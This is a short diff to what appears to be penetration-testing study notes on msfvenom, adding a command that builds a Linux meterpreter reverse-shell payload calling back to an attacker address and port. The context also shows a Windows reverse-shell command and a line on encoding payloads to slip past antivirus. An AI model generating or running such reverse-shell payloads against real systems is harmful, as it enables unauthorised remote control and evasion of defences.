@@ -267,7 +267,9 @@ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 
 	- -f : filetype/formats
 	- local-host and local-port of the attacker to reverse back to
 
-
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.13.69.46 LPORT=4444 -o shell.php
+```
 
 ### Encoding_Payloads
 Encoding a payload helps to avoid antivirus solutions with signature based detection.
